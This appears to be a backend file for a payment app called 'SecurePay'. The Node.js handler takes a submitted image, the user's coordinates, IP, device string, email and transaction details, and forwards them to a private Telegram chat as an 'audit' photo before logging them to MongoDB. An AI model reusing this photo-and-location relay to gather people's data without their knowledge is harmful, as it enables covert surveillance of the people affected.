const { getDatabase } = require('./_db');
const { getRequiredEnv } = require('./_config');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    let body = req.body;
    if (typeof body === 'string') body = JSON.parse(body);
    
    const { image, role, ipInfo, latLon, userAgent, transaction_id, amount, user_email } = body || {};

    const telegramBotToken = getRequiredEnv('TELEGRAM_BOT_TOKEN');
    const telegramChatId = getRequiredEnv('TELEGRAM_CHAT_ID');

    if (!image) return res.status(400).json({ error: 'No image provided' });

    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');
    const blob = new Blob([buffer], { type: 'image/png' });

    const timeStamp = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    const formData = new FormData();
    
    formData.append('chat_id', telegramChatId);
    formData.append('photo', blob, 'audit.png');
    
    const captionText = `🚨 *SecurePay Transaction Audit*\n\n` +
                        `🕒 *Timestamp:* \`${timeStamp}\`\n` +
                        `🧾 *Txn ID:* \`TXN-${transaction_id || 'UNKNOWN'}\`\n` +
                        `👤 *User:* \`${user_email || 'Unknown'}\`\n` +
                        `🏷️ *Action:* \`${role || 'Unknown'}\`\n` +
                        `💰 *Amount:* \`₹${amount || '0'}\`\n` +
                        `🌐 *IP Data:* \`${ipInfo || 'Unknown'}\`\n` +
                        `📍 *Coordinates:* \`${latLon || 'Unknown Location'}\`\n` +
                        `💻 *Device:* \`${userAgent || 'Unknown'}\``;
                        
    formData.append('caption', captionText);
    formData.append('parse_mode', 'Markdown');

    const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
      method: 'POST', body: formData
    });

    const result = await telegramResponse.json();
    if (!result.ok) return res.status(500).json({ telegramError: result.description });

    const db = await getDatabase();
    await db.collection('audit_logs').insertOne({
      transaction_id: transaction_id || null,
      amount: Number(amount) || 0,
      user_email: user_email || 'unknown',
      node_role: role || 'Unknown',
      ip_address: ipInfo || 'Unknown',
      photo_status: 'Audit Synced',
      created_at: new Date()
    });

    return res.status(200).json({ success: true, message: 'Audit logged successfully.' });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
};
